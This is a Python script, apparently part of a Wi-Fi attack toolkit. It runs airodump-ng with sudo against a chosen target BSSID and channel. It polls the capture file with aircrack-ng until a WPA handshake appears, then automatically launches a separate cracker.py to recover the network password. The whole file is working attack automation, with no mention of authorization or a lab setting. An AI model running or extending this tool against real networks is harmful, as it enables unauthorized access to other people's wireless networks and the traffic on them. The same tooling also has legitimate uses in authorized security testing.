import subprocess
import sys
import os
import signal
import re
import time

from rich import print
from pyfiglet import figlet_format

print(f"[bold green]{figlet_format('CAPTURE')}[/bold green]")


CHECK_INTERVAL_SECONDS = 5
MAX_CAPTURE_SECONDS = 300


def clean_folder_name(name):
    name = name.strip()
    name = re.sub(r'[\\/:*?"<>|]', "", name)
    name = re.sub(r"\s+", "_", name)

    if name == "":
        name = "Unknown_Target"

    return name


def get_unique_folder(folder_path):
    if not os.path.exists(folder_path):
        return folder_path

    counter = 1

    while os.path.exists(f"{folder_path}{counter}"):
        counter += 1

    return f"{folder_path}{counter}"


# ===================== HANDSHAKE CHECK START =====================
# This checks the .cap file using aircrack-ng.
# It uses the same style as your manual successful command:
#
# aircrack-ng captures/Redwood4/capture-01.cap
#
# If aircrack-ng shows WPA (1 handshake), this returns True.

def has_handshake(cap_file, target_bssid):
    if not os.path.exists(cap_file):
        return False

    if os.path.getsize(cap_file) == 0:
        return False

    try:
        result = subprocess.run(
            [
                "aircrack-ng",
                cap_file
            ],
            capture_output=True,
            text=True,
            timeout=15
        )

        output = result.stdout + result.stderr

        for line in output.splitlines():
            if target_bssid.lower() in line.lower() and "handshake" in line.lower():
                if "0 handshake" not in line.lower():
                    return True

        if "wpa (1 handshake)" in output.lower():
            return True

    except subprocess.TimeoutExpired:
        return False

    return False

# ====================== HANDSHAKE CHECK END ======================


# ===================== AUTO TARGET DATA START =====================
# main.py sends:
# python3 capture.py BSSID CHANNEL INTERFACE SSID

if len(sys.argv) >= 5:
    target_bssid = sys.argv[1]
    channel = sys.argv[2]
    interface = sys.argv[3]
    target_name = sys.argv[4]
else:
    target_bssid = input("Target BSSID: ").strip()
    channel = input("Channel: ").strip()
    interface = input("Monitor Interface: ").strip()
    target_name = input("Target Name: ").strip()

# ====================== AUTO TARGET DATA END ======================


print(f"[green]Target Name:[/green] {target_name}")
print(f"[green]Target BSSID:[/green] {target_bssid}")
print(f"[green]Channel:[/green] {channel}")
print(f"[green]Monitor Interface:[/green] {interface}")


# ===================== CAPTURE FOLDER SETUP START =====================
# Creates:
#
# captures/
# ├── Redwood/
# ├── Redwood1/
# └── Redwood2/

safe_target_name = clean_folder_name(target_name)

base_capture_folder = os.path.join("captures", safe_target_name)
capture_folder = get_unique_folder(base_capture_folder)

os.makedirs(capture_folder, exist_ok=True)

capture_name = os.path.join(capture_folder, "capture")
cap_file = f"{capture_name}-01.cap"
error_file = os.path.join(capture_folder, "error.log")

# ====================== CAPTURE FOLDER SETUP END ======================


print(f"[green]Capture Folder:[/green] {capture_folder}")

print("\n[cyan]Starting handshake capture...[/cyan]")
print("[yellow]Waiting for WPA handshake automatically...[/yellow]")
print("[yellow]Press CTRL+C if you want to cancel.[/yellow]\n")

subprocess.run(["sudo", "-v"], check=True)

error_output = open(error_file, "w")

capture_process = subprocess.Popen(
    [
        "sudo",
        "-n",
        "airodump-ng",
        "--bssid",
        target_bssid,
        "-c",
        channel,
        "--write",
        capture_name,
        interface
    ],
    stdin=subprocess.DEVNULL,
    stdout=subprocess.DEVNULL,
    stderr=error_output,
    preexec_fn=os.setsid
)


# ===================== AUTO HANDSHAKE WAIT START =====================
# Instead of waiting for ENTER, this keeps checking the .cap file.
# Once a handshake is found, it stops capture and continues to cracker.py.

handshake_found = False
start_time = time.time()

try:
    while True:
        elapsed = int(time.time() - start_time)

        print(f"[cyan]Checking for handshake...[/cyan] {elapsed}s elapsed")

        if has_handshake(cap_file, target_bssid):
            handshake_found = True
            print("\n[bold green]Handshake captured![/bold green]")
            break

        if MAX_CAPTURE_SECONDS != 0 and elapsed >= MAX_CAPTURE_SECONDS:
            print("\n[red]No handshake captured within the time limit.[/red]")
            break

        time.sleep(CHECK_INTERVAL_SECONDS)

except KeyboardInterrupt:
    print("\n[yellow]Capture cancelled by user.[/yellow]")

# ====================== AUTO HANDSHAKE WAIT END ======================


print("\n[cyan]Stopping capture...[/cyan]\n")

try:
    os.killpg(os.getpgid(capture_process.pid), signal.SIGINT)
    capture_process.wait(timeout=5)
except subprocess.TimeoutExpired:
    capture_process.terminate()
    capture_process.wait()

error_output.close()

print("[green]Capture stopped.[/green]")
print(f"[yellow]Files saved in:[/yellow] {capture_folder}")

if os.path.exists(error_file) and os.path.getsize(error_file) > 0:
    print(f"[yellow]If something failed, check:[/yellow] {error_file}")


# ===================== AUTO CRACK START =====================
# Only start cracking if handshake was actually detected.

if handshake_found and os.path.exists(cap_file):
    print("\n[cyan]Launching cracker.py automatically...[/cyan]\n")

    subprocess.run([
        "python3",
        "cracker.py",
        cap_file,
        target_bssid,
        target_name
    ])
else:
    print("[yellow]Cracker not started because no handshake was detected.[/yellow]")

# ====================== AUTO CRACK END ======================
